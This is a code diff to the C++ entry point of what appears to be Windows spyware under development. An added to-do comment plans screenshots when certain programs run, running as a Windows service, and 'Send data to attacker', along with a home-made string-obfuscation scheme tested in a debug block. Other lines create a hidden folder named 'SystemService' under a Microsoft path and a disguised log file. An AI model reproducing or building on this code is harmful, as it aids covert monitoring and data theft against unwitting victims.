@@ -4,9 +4,27 @@
 #include "sys.h"
 #include "debug.h"
 
-int main() {
-
 #ifdef DEBUG_BUILD
+#include "encrypt.h"
+#endif
+
+/*
+ * LIST:
+ *  - Only screenshot or start when whitelisted program is running
+ *  - Run as Win Service
+ *  - Send data to attacker
+ *  - ASCII -> Binary (Reverse) -> ASCII (Divide & Remainder) -> 1st (Divide result) -> 2nd BINARY(shift left by remainder)
+ */
+
+int main() {
+#ifdef DEBUG_BUILD
+  std::string a = "a";
+  std::string b = Crypt::StrToBinary(a);
+  debn(b)
+  char *c = Crypt::BinaryToStr(b);
+  debn(*c);
+  debn((int)*c);
+
 #endif
 
 #ifndef DEBUG_BUILD
@@ -30,7 +48,7 @@ int main() {
   mainDir.name = "SystemService";
   mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));
 
-  DEBN(Stream::GetPath("\\Microsoft\\" + mainDir.name))
+  debn(Stream::GetPath("\\Microsoft\\" + mainDir.name))
 
   Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
   Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
